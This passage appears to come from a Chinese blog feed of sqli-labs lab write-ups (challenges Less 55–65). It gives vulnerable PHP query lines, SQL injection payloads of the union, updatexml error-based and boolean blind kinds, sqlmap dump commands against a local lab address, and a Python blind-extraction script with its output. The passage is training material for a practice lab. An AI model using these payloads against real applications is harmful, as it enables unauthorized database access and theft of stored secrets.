        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable"><span class="token punctuation">((</span>'$id'<span class="token punctuation">))</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式 ‘))</p><p><code>?id=1')) and 1=1--+</code><br><code>?id=1')) and 1=2--+</code></p><p><a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">')) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：vo9h7b29b1爆破字段名?id=-1'</span><span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'vo9h7b29b1'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_T03L获取密码?id<span class="token operator">=</span>-1'<span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_T03L from vo9h7b29b1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：zA5wJbBXHvyGPdbQ8phfJBBn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less60</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less60/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less60/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'("'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'")'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式”)</p><p><code>?id=1") and 1=1--+</code><br><code>?id=1") and 1=2--+</code></p><p><a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">") and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：kpt3mvazyg爆破字段名?id=-1"</span><span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'kpt3mvazyg'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_NRFF获取密码?id<span class="token operator">=</span>-1"<span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_NRFF from kpt3mvazyg<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：vI7A4DnWuwDoNK8NMXKQyYHm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less59</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less59/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less59/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式数字型</p><p><code>?id=1 and 1=1--+</code><br><code>?id=1 and 1=2--+</code> <a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +数据表：codgf1m6wa爆破字段名?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'codgf1m6wa'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_JGAS获取密码?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_JGAS from codgf1m6wa<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：JvKSBvmuHkWi8od1IZnHs94e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less57</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less57/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less57/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此关闭合方式为双引号**”**,在十四次之内找到通关密码即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表 ?id<span class="token operator">=</span>-1<span class="token string">" union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 数据表：4tx6x8i0r6爆破数据字段?id=-1"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'4tx6x8i0r6'</span>--+ 字段：secret_5NSX获取密码?id<span class="token operator">=</span>-1"union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select secret_5NSX from 4tx6x8i0r6<span class="token punctuation">)</span>--+密码：UpYmUvGqIBq77VJwWtBdP1s7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less56</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less56/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less56/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此关闭合方式为’),在十四次之内找到通关密码即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表 ?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 数据表：2f9r4ilh2y爆破数据字段 ?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'2f9r4ilh2y'</span>--+ 字段：secret_BL6H获取密码?id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select secret_BL6H from 2f9r4ilh2y<span class="token punctuation">)</span>--+密码：eOSw9qFmolZQu7VpE0ipHRV4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less55</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less55/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less55/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式为小括号),一共十四次机会\ <a name="qqbdN"></a></p><h1 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h1><p><code>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code>&amp;#x20;<br>数据表：3cr26yzl9f <a name="bNqYh"></a></p><h1 id="爆破数据字段"><a href="#爆破数据字段" class="headerlink" title="爆破数据字段"></a>爆破数据字段</h1><p><code>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name='3cr26yzl9f'--+</code>&amp;#x20;<br>字段：secret_TATB <a name="VdFKq"></a></p><h1 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h1><p><code>?id=-1) union select 1,2,(select secret_TATB from 3cr26yzl9f)--+</code><br>密码：zXYZR5qfxz3Q2LUi8v1ip6dx</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less65</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less65/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less65/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后的闭合方式为双引号加小括号**”) ** <a name="tTcqx"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 --current-db </code></p><blockquote><p>challenges</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges --tables</code></p><blockquote><p>ha0jys304v</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges -T ha0jys304v --dump</code></p><blockquote><p>WNpZ8ZytUpExmC9fRdiAtLF2</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less64</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less64/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less64/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable"><span class="token punctuation">((</span>$id<span class="token punctuation">))</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此关的闭合方式为双括号))，还是盲注的问题</p><p><a name="tTcqx"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><code>sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges --tables</code></p><blockquote><p>1wo4hyndr5</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges -T 1wo4hyndr5 --dump</code></p><blockquote><p>k0Kx2B7urBqzcrJ5uwEoMcEI</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less62</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过简单的测试发现没有了回显，试一试布尔盲注，有130次机会</p><p><code>?id=1')--+</code><br>回显正确，说明要闭合’)</p><p><code>?id=1') order by 3--+</code><br>回显正常<br><code>?id=1') order by 4--+</code><br>非正常回显<br>说明有3个字段 <a name="bKHrc"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>二分法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">猜解数据库表名,?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;100--+回显正常，说明第一个字母ASCII小于100?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">50</span>--+回显正常，说明第一个字母ASCII大于50爆破字段名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 1,1),1,1)))&gt;50--+回显正确，说明第一个字符的ASCII值大于50?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span>'users' limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">100</span>--+回显正确，说明第一个字符的ASCII值小于100字段名?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+回显正确，说明第一个字符的ASCII值小于80?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span> select  id users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">30</span>--+回显正确，说明第一个字符的ASCII值大于30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="Iv94S"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注入点检查sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span>数据库名称sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> --current-db <span class="token parameter variable">--level</span> <span class="token number">3</span>数据库：challenges数据表名称sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> <span class="token string">"challenges"</span> <span class="token parameter variable">--tables</span>数据表：p108evlf4Cp108evlf4C密码sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> <span class="token string">"challenges"</span> <span class="token parameter variable">-T</span> <span class="token string">"p108evlf4C"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="FmWXj"></a></p><h1 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/python3</span><span class="token comment"># -*-coding:utf-8-*-</span><span class="token function">import</span> re<span class="token function">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.193/Less-62/?id=1"</span>  <span class="token comment"># 改成你的地址</span>try_count <span class="token operator">=</span> <span class="token number">0</span>def extract_bits<span class="token punctuation">(</span>query, i, bit_values: list<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query执行结果的第 i 个（从1开始算）字符的3个比特    哪3个比特由bit_values指定    <span class="token string">""</span>"    global try_count    assert len<span class="token punctuation">(</span>bit_values<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span>    bit_marks <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> bit_values:        bit_marks <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">v</span>    payload <span class="token operator">=</span> <span class="token string">""</span>"    <span class="token string">'+(SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) &amp; ({bit_mark})    WHEN {0} THEN 1    WHEN {1} THEN 2    WHEN {2} THEN 3    WHEN {3} THEN 4    WHEN {4} THEN 5    WHEN {5} THEN 6    WHEN {6} THEN 7    ELSE 8END)+'</span>    <span class="token string">""</span>".format<span class="token punctuation">(</span>*bit_values<span class="token punctuation">[</span>:7<span class="token punctuation">]</span>, <span class="token assign-left variable">query</span><span class="token operator">=</span>query, <span class="token assign-left variable">bit_mark</span><span class="token operator">=</span>bit_marks, <span class="token assign-left variable">i</span><span class="token operator">=</span>i<span class="token punctuation">)</span>    payload <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">'\s+'</span>, <span class="token string">' '</span>, payload.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">" "</span><span class="token punctuation">))</span>    <span class="token comment"># print(payload)</span>    resp <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url, <span class="token assign-left variable">params</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token builtin class-name">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>    try_count <span class="token operator">+=</span> <span class="token number">1</span>    infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Angelina"</span>, <span class="token string">"Dummy"</span>, <span class="token string">"secure"</span>, <span class="token string">"stupid"</span>, <span class="token string">"superman"</span>, <span class="token string">"batman"</span>, <span class="token string">"admin"</span>, <span class="token string">"admin1"</span><span class="token punctuation">]</span>    match <span class="token operator">=</span> re.search<span class="token punctuation">(</span>r<span class="token string">"Your Login name : (.*?)&lt;br&gt;"</span>, resp.text<span class="token punctuation">)</span>    assert match    assert match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">in</span> infos    bits <span class="token operator">=</span> bit_values<span class="token punctuation">[</span>infos.index<span class="token punctuation">(</span>match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token punctuation">]</span>    <span class="token builtin class-name">return</span> bitsdef extract_data<span class="token punctuation">(</span>query, length<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query查询结果的length个字符，每个字符只获取其第7位和前5位    <span class="token string">""</span>"    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span>, length+1<span class="token punctuation">)</span>:        b2 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 00000111</span>        b1 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 01011000</span>        <span class="token keyword">if</span> b1 <span class="token operator">&amp;</span> 0b01000000 <span class="token operator">==</span> <span class="token number">0</span>:            <span class="token comment"># 该字符为数字</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2 <span class="token operator">|</span> 0b00100000        else:            <span class="token comment"># 该字符为字母</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    <span class="token builtin class-name">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>    table_name <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1"</span>, <span class="token number">10</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"table_name:"</span>, table_name<span class="token punctuation">)</span>    secret_key <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x"</span> % table_name, <span class="token number">24</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"secret_key:"</span>, secret_key<span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"Done. try_count:"</span>, try_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># python3 1.py          </span>table_name: KGP53AD9TAsecret_key: VHWF7RD0GNPXMAUTDA2537WODone. try_count: <span class="token number">68</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less58</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过猜解发现闭合方式为单引号’<br>&amp;#x20;尝试后发现没有了回显，采用报错注入的方式进行爆破</p><p><code>?id=1' and 1=1--+</code><br><code>?id=1' and 1=2--+</code> <a name="xUWO0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：ya8oopss6p爆破字段名?id=-1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token 